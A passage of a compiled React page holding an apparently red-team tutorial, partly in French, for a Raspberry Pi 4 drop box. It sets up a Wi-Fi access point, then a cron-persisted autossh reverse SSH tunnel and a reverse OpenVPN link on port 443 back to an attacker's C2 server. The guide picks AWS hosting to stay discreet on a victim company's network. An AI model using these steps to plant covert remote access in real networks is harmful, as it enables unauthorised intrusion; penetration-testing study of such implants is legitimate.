of net.ipv4.ip_forward=1]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 201\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 201\n      },\n      __self: this\n    }), \"Finally, use your IPTables-magic to masquerade client connections to the Internet:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 203\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 203\n      },\n      __self: this\n    }), \"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 205\n      },\n      __self: this\n    }), \"There is a package available in Kali to make these changes to IPTables last.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 206\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 206\n      },\n      __self: this\n    }), \"apt-get install iptables-persistent\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 208\n      },\n      __self: this\n    }), \"iptables-save > /etc/iptables/rules.v4\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 209\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 209\n      },\n      __self: this\n    }), \"##To ensure the iptables rules get loaded before the network interface at boot, we will create a short script in the /etc/network/if-pre-up.d/ directory:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 210\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 210\n      },\n      __self: this\n    }), \"nano /etc/network/if-pre-up.d/iptables\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 212\n      },\n      __self: this\n    }), \"Add the following code to the above /etc/network/if-pre-up.d/iptables file, then save:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 213\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 213\n      },\n      __self: this\n    }), \"#!/bin/bash\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 215\n      },\n      __self: this\n    }), \"/usr/sbin/iptables-restore \", '<', \" /etc/iptables/rules.v4\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 216\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 216\n      },\n      __self: this\n    }), \"chmod +x /etc/network/if-pre-up.d/iptables\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 218\n      },\n      __self: this\n    }), \"reboot\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 220\n      },\n      __self: this\n    }), \"##You should now see a wireless network named \\u201Ciphone10\\u201D (or whatever named you use)\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 221\n      },\n      __self: this\n    }), \" where you can connect to it with your wpa_passphrase you set earlier. You\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 221\n      },\n      __self: this\n    }), \" should also have Internet too assuming your Raspberry Pi 4 has Internet. Once\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 221\n      },\n      __self: this\n    }), \" connected, you can also SSH into your Raspberry Pi 4.\"), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 224\n      },\n      __self: this\n    }, \"Configurer un tunnel reverse shell automatique\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 225\n      },\n      __self: this\n    }, \"Cette section suppose que vous disposez d'un serveur de commande et de contr\\xF4le accessible sur Internet et que SSH est activ\\xE9 sur le serveur.\"), React.createElement(\"div\", {\n      id: \"wifi\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 227\n      },\n      __self: this\n    }, \"apt-get install autossh \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 228\n      },\n      __self: this\n    }), \"ssh-keygen [Leave all of the settings default] \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 229\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 229\n      },\n      __self: this\n    }), \"scp /root/.ssh/id_rsa.pub root@[C2 IP Address]:/directory/on/C2\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 231\n      },\n      __self: this\n    }), \"Append the contents of id_rsa.pub to ~/.ssh/authorized_keys or create this file on the C2 server:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 234\n      },\n      __self: this\n    }), \"[On the C2 server] cat /directory/to/upload/to/id_rsa.pub >> ~/.ssh/authorized_keys\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 238\n      },\n      __self: this\n    }), \"[On the RASPBERRY Pi 4]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 240\n      },\n      __self: this\n    }), \"ssh root@[C2 IP address]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 242\n      },\n      __self: this\n    }), \"Test \\u201Cautossh\\u201D:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 243\n      },\n      __self: this\n    }), \"autossh -M 11166 -i /root/.ssh/id_rsa -R 6667:localhost:22 root@[C2 IP Address]\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 245\n      },\n      __self: this\n    }), \"If you login to your VPS/C2 server, you should now see port 6667 present after you run a \\u201Cnetstat -antp\\u201D command.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 246\n      },\n      __self: this\n    }), \"To have the autossh start at boot, we will create a cronjob that points to a script. First we will create a bash script for our autossh file:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 248\n      },\n      __self: this\n    }), \"nano /bin/autossh-connect.sh\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 250\n      },\n      __self: this\n    }), \"Then we place the autossh command inside the autossh-connect.sh file:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 251\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 251\n      },\n      __self: this\n    }), \"#!/bin/bash\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 253\n      },\n      __self: this\n    }), \"autossh -M 11166 -N -f -o \\u201CPubkeyAuthentication=yes\\u201D -o \\u201CPasswordAuthentication=no\\u201D \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 254\n      },\n      __self: this\n    }), \"-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Your C2 Server IP] &\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 254\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 254\n      },\n      __self: this\n    }), \"-N: Do not execute a command on the middleman machine\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 256\n      },\n      __self: this\n    }), \"-f: Drop in the background\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 257\n      },\n      __self: this\n    }), \"&: Execute this command but do not wait for output or an exit code. If this is not added, your machine might hang at boot\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 258\n      },\n      __self: this\n    }), \"For the cronjob creation, type the following command:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 260\n      },\n      __self: this\n    }), \"crontab -e\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 262\n      },\n      __self: this\n    }), \"At the bottom of the script (no \\u201C#\\u201D should be in front of what you are typing), add the following:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 263\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 263\n      },\n      __self: this\n    }), \"@reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 265\n      },\n      __self: this\n    }), \"*/5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 266\n      },\n      __self: this\n    }), \"This tells the cron job after reboot to wait 5 seconds and run the \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 267\n      },\n      __self: this\n    }), \"autossh-connect.sh script which will start the autossh process. \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 267\n      },\n      __self: this\n    }), \"The 5 seconds was added to ensure the network manager has started first. The \\u201C> /dev/null 2>&1\\u201D part ensures that no logs are written out to any files as to not take up space. On the second line, the cron job will also try and run every 5 minutes. This is due in case the autossh job gets disconnected or fails for whatever reason.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 269\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 269\n      },\n      __self: this\n    }), \"That\\u2019s it. Now when your Raspberry Pi 4 starts, it should autossh to your C2 server which will create a local port of 6667 on the C2 server. When you SSH from your attacker system onto the C2 server, you can run the following command on your C2 server to get access to your Raspberry Pi 4 device:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 271\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 271\n      },\n      __self: this\n    }), \"ssh localhost -p 6667 [This is ran on the C2 server]\"), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 277\n      },\n      __self: this\n    }, \"Configurer un client et un serveur Openvpn\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 278\n      },\n      __self: this\n    }, \"En plus du reverse shell SSH pour acc\\xE9der \\xE0 notre Raspberry, il serait \\xE9galement int\\xE9ressant de configurer l'appareil pour utiliser une connexion OpenVPN invers\\xE9e sur le port 443 (HTTPS).\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 279\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 279\n      },\n      __self: this\n    }), \"\\xC9tant donn\\xE9 que la Raspberry sera probablement d\\xE9pos\\xE9e \\xE0 l'arri\\xE8re d'un switch dans une entreprise, nous ne pourrons pas nous y connecter directement. Par cons\\xE9quent, la Raspberry doit d'abord sortir par le port 443 vers notre serveur OpenVPN Access Server. Depuis notre machine d'attaque nous devrons \\xE9galement nous connecter au serveur VPN. Cela est une assurance du fait que si le client bloque le port 22 sortant pour SSH, nous aurons une autre option pour se connecter via le port 443 (HTTPS).\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 283\n      },\n      __self: this\n    }, \"Il faut pour cela r\\xE9aliser les 3 \\xE9tapes suivantes :\"), React.createElement(\"ul\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 284\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 285\n      },\n      __self: this\n    }, \"Configuration d'OpenVPN Access Server sur Internet\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 286\n      },\n      __self: this\n    }, \"Configuration de la Raspberry\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 287\n      },\n      __self: this\n    }, \"Configuration de la machine d'attaque\")), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 290\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 292\n      },\n      __self: this\n    }, \"Mise en place OpenVPN Access Server\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 293\n      },\n      __self: this\n    }, \"Pour la solution d'h\\xE9bergement de notre serveur VPN on peut opter pour un serveur VPS car ils sont extr\\xEAmement faciles et rapides \\xE0 configurer.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 293\n      },\n      __self: this\n    }), React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 295\n      },\n      __self: this\n    }, \"Vultr.com \"), \"et \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 295\n      },\n      __self: this\n    }, \"Amazon Lightsail\"), \" sont deux fournisseurs de VPS rapides, bon march\\xE9 et simples \\xE0 configurer. L'autre raison de choisir ces fournisseurs VPS est que le r\\xE9seau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'\\xEAtre plus discret.\"), React.createElement(\"ol\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 298\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 299\n      },\n      __self: this\n    }, \"Allez sur https://aws.amazon.com/lightsail/ et cr\\xE9ez un nouveau VPS\"), \"Une fois cr\\xE9e, allez sur Manage -> Networking Ajoutez 2 r\\xE8gles firewall sur les ports (443 et 943)\", React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 305\n      },\n      __self: this\n    }, \"Installez un OS, par exemple Ubuntu. Faire un chmod 600 de la SSH key et se connectez sur le VPS server \\xE0 partir de la machine d'attaque : \"), \"ssh -i LightsailDefaultPrivateKey-us-west-2.pem user@[IP] sudo su -\", React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 308\n      },\n      __self: this\n    }, \"Update le serveur:\"), \"apt-get update && apt-get upgrade\", React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 310\n      },\n      __self: this\n    }, React.createElement(\"a\", {\n      href: \"https://openvpn.net/vpn-software-packages/\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 310\n      },\n      __self: this\n    }, \"Installez OpenVPN AS\")), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 312\n      },\n      __self: this\n    }, \"Copiez le lien et t\\xE9l\\xE9chargez-le, par exemple:\"), \"wget https://openvpn.net/downloads/openvpn-as-latest-ubuntu18.amd_64.deb\", React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 314\n      },\n      __self: this\n    }, \"Installez OpenVPN AS\"), \"dpkg -i openvpn-as-latest-ubuntu18.amd_64.deb\", React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 316\n      },\n      __self: this\n    }, \"Supprimez le profil actuel et configurez OpenVPN:\"), \"/usr/local/openvpn_as/bin/ovpn-init\", React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 318\n      },\n      __self: this\n    }, \"Tapez DELETE: (sensible \\xE0 la casse)\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 319\n      },\n      __self: this\n    }, \"Finir l'installation comme suit\")), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 321\n      },\n      __self: this\n    }, \"Accept EULA: yes \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 321\n      },\n      __self: this\n    }), \"Will this be the primary Access Server node: yes \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 322\n      },\n      __self: this\n    }), \"Please specify the network interface and IP address to be \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 323\n      },\n      __self: this\n    }), \"used by the Admin Web UI: \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 324\n      },\n      __self: this\n    }), \"(1) all interfaces: 0.0.0.0 \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 325\n      },\n      __self: this\n    }), \"(2) eth0: 45.77.217.54 \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 326\n      },\n      __self: this\n    }), \"Answer: 1 \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 327\n      },\n      __self: this\n    }), \"Please specify the port number for the Admin Web UI. \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 328\n      },\n      __self: this\n    }), \"Answer: 943 \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 329\n      },\n      __self: this\n    }), \"Should client traffic be routed by default through the VPN? \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 330\n      },\n      __self: this\n    }), \"Answer: YES \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 331\n      },\n      __self: this\n    }), \"Should client DNS traffic be routed by default through the VPN? \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 332\n      },\n      __self: this\n    }), \"Answer: YES \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 333\n      },\n      __self: this\n    }), \"Use local authentication via internal DB? \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 334\n      },\n      __self: this\n    }), \"> Press ENTER for default [no]:  \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 335\n      },\n      __self: this\n    }), \"Answer: YES \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 336\n      },\n      __self: this\n    }), \"The rest of these answers should be default. Simply hit the 'Enter' key \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 337\n      },\n      __self: this\n    }), \"Change OpenVPN Admin password: \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 338\n      },\n      __self: this\n    }), \"passwd openvpn supersecretpassword123 [Set your own unique password here] \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 339\n      },\n      __self: this\n    }), \"[Note - This is a great time to put IPTables for port 943 to only allow connections from your networks.]\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 342\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 344\n      },\n      __self: this\n    }, \"Configuration de OpenVPN AS Server\"), React.createElement(\"ol\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 346\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 347\n      },\n      __self: this\n    }, \"Allez sur https://[IP Address du serveur VPS]:943/admin/\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 348\n      },\n      __self: this\n    }, \"Se connecter avec le compte \\\"openvpn\\\" et le mot de passe r\\xE9cemment cr\\xE9e \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 348\n      },\n      __self: this\n    }), \"Note: Si vous utilisez AWS Lightsail, assurez-vous dans les param\\xE8tres que le nom d'h\\xF4te ou l'adresse IP est l'adresse IP publique et non la priv\\xE9e, puis enregistrez et mettez \\xE0 jour.\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 350\n      },\n      __self: this\n    }, \"Dans OpenVPN, v\\xE9rifiez que l'authentification est d\\xE9finie sur locale: \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 350\n      },\n      __self: this\n    }), \"Authentication -> General -> Set to Local (On) -> Save Settings -> Update Server\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 352\n      },\n      __self: this\n    }, \"Cr\\xE9ez deux utilisateurs avec l'option `Autoriser la connexion automatique activ\\xE9e` (rasp4 and redteam). Allez sur User Management -> User Permissions\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 352\n      },\n      __self: this\n    }), \"Pour chaque utilisateur:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 353\n      },\n      __self: this\n    }), \"Set AllowAuto-login\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 355\n      },\n      __self: this\n    }, \"Pour que les 2 comptes permettent la connectivit\\xE9 via VPN, nous devons activer certaines autorisations. Assurez-vous d'activer les autorisations de l'utilisateur:\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 355\n      },\n      __self: this\n    }), \"All server-side private subnets\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 356\n      },\n      __self: this\n    }), \"All other VPN clients\")), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 360\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 361\n      },\n      __self: this\n    }, \"T\\xE9l\\xE9charger les profils OpenVPN\"), React.createElement(\"ol\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 362\n      },\n      __self: this\n    }, React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 363\n      },\n      __self: this\n    }, \"Se connecter et t\\xE9l\\xE9charger les profils https://[Your VPS]:943/?src=connect\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 364\n      },\n      __self: this\n    }, \"Pour chaque utilisateur se connecter et t\\xE9l\\xE9charger le profil\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 365\n      },\n      __self: this\n    }, \"Sauvegarder rasp4.ovpn et redteam.ovpn\")), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 368\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 370\n      },\n      __self: this\n    }, \"Configuration de la Raspberry Pi 4\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 371\n      },\n      __self: this\n    }, \"Allumez la Raspberry Pi 4 et branchez un c\\xE2ble ethernet\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 372\n      },\n      __self: this\n    }, \"Installez OpenVPN: apt-get install openvpn\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 373\n      },\n      __self: this\n    }, \"Configurez le d\\xE9marrage automatique de OpenVPN dans le fichier :\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 373\n      },\n      __self: this\n    }), \"nano /etc/default/openvpn \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 374\n      },\n      __self: this\n    }), \"[D\\xE9commentez \\u2018AUTOSTART=\\u201Dall\\u201D\\u2019]\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 376\n      },\n      __self: this\n    }, \"Copiez le fichier .ovpn sur la Raspberry :\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 376\n      },\n      __self: this\n    }), \"scp rasp4.ovpn [Raspberry Pi 4 IP]:/etc/openvpn\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 377\n      },\n      __self: this\n    }, \"Allez dans /etc/openvpn et renommez rasp4.ovpn en client.conf: \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 377\n      },\n      __self: this\n    }), \"cd /etc/openvpn \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 377\n      },\n      __self: this\n    }), \"mv rasp4.ovpn client.conf\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 378\n      },\n      __self: this\n    }, \"Activez OpenVPN pour d\\xE9marrer au boot: \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 378\n      },\n      __self: this\n    }), \"update-rc.d openvpn enable\"), React.createElement(\"li\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 379\n      },\n      __self: this\n    }, \"Puis reboot\"), React.createElement(\"p\", {\n      className: \"tabulation\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 381\n      },\n      __self: this\n    }, \"Cela va lancer le client OpenVPN sur la Raspberry Pi 4. Pour vous assurer que cela fonctionne, retournez dans votre serveur OpenVPN AS et v\\xE9rifiez les connexions. Acc\\xE9dez \\xE0 \\\"Utilisateurs actuels\\\" dans le menu \\xC9tat et vous devriez voir le nom d'utilisateur \\\"rasp4\\\" avec l'adresse r\\xE9elle comme adresse WAN externe de l'endroit o\\xF9 la Raspberry Pi 4 est branch\\xE9e et une adresse VPN. \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 381\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 381\n      },\n      __self: this\n    }), \"Nous avons \\xE0 pr\\xE9sent la Raspberry Pi 4 configur\\xE9e de sorte que d\\xE8s lors qu'elle se connecte \\xE0 un r\\xE9seau, elle va chercher \\xE0 se reconnecter \\xE0 notre serveur VPN.\"), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 385\n      },\n      __self: this\n    }), React.createElement(\"h3\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 387\n      },\n      __self: this\n    }, \"Configuration GSM pour la box\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 389\n      },\n      __self: this\n    }, \"Lien pour dongle : \", React.createElement(\"a\", {\n      href: \"http://shop.mchobby.be/product.php?id_product=677\",\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 389\n      },\n      __self: this\n    }, \"dongle GSM (23,60\\u20AC)\"), \" Module/modem 3G HSDPA, interface USB, support SMS et connexion internet.\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 392\n      },\n      __self: this\n    }, \"Ce module permet d'\\xE9tablir des connexions Internet via le r\\xE9seau 3G... et d'obtenir une connexion Internet l\\xE0 o\\xF9 vous ne disposez pas d'ADSL, de ligne t\\xE9l\\xE9phonique classique, ou de WiFi. Avant de brancher la clef USB \\xE0 la Raspberry, il faut se rendre dans le fichier de configuration :\"), React.createElement(\"p\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 395\n      },\n      __self: this\n    }, \"Editer le fichier \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 395\n      },\n      __self: this\n    }, \"config.txt\"), \" dans le dossier /boot/ Ajouter la ligne suivante: \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 396\n      },\n      __self: this\n    }, \"max_usb_current=1\"), \"Apr\\xE8s reboot, vous pouvez brancher la clef USB \\xE0 la Raspberry \", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 397\n      },\n      __self: this\n    }), React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 397\n      },\n      __self: this\n    }), \"Si vous tapez la commande \", React.createElement(\"strong\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 399\n      },\n      __self: this\n    }, \"lsusb\"), \" vous devriez la voir dans la liste. Sinon il faut proc\\xE9der \\xE0 la v\\xE9rification du mat\\xE9riel et de la connectique.\", React.createElement(\"br\", {\n      __source: {\n        fileName: _jsxFileName,\n        lineNumber: 400\n      },\n      __self: this\n    }), \"$ sudo apt-get update $ sudo apt-get install ppp wvdial Configuration de wvdial Le fichier de configuration de wvdial se trouve dans le dossier /etc/wvdial.conf Nous allons donc l'\\xE9diter en tapant la commande: sudo nano /etc/wvdial.conf Le fichier de configuration est un fichier texte comme celui-ci dessous [Dialer Defaults] Init1 = ATZ Init2 = ATQ0 V1 E1 S0=0 &C1 &D2 Init3 = AT+CGDCONT=1,\\\"IP\\\",\\\"web.be\\\" Stupid Mode = 1 Modem Type = Analog Modem ISDN = 0 New PPPD = yes Phone = *99# Modem = /dev/ttyUSB0 Username = web Password = web Baud = 9600 Notez que les param\\xE8tres de connections web.be, web, web sont des param\\xE8tres propres \\xE0 vos op\\xE9rateurs 3G (web.be, web, web sont les 